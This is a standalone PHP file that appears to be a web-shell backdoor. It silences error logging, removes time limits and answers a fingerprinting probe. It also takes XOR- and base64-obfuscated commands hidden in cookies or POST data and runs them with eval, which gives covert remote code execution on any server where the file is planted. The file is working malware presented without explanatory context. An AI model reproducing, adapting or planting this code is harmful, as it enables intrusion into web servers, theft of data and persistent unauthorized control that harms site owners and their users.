<?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
if (isset($_GET[673435]))
{
    die(md5(47712));
}
function shdp($data, $key)
{
    $out_data = "";
    for ($i = 0; $i < strlen($data);) {
        for ($j = 0; $j < strlen($key) && $i < strlen($data); $j++, $i++) {
            $out_data .= chr(ord($data[$i]) ^ ord($key[$j]));
        }
    }
    return $out_data;
}

$temp=array_merge($_COOKIE, $_POST);
foreach ($temp as $data_key => $data) {
    $data = @unserialize(shdp(shdp(base64_decode($data), '4ef63abe-1abd-45a6-913d-6fb99657e24b'), $data_key));
    if (isset($data['ak'])) {
        if ($data['a'] == 'i') {
            $i = array(
                'pv' => @phpversion(),
                'sv' => '1.0-1',
            );
            echo @serialize($i);
        } elseif ($data['a'] == 'e') {
            eval($data['d']);
        }
        exit();
    }
}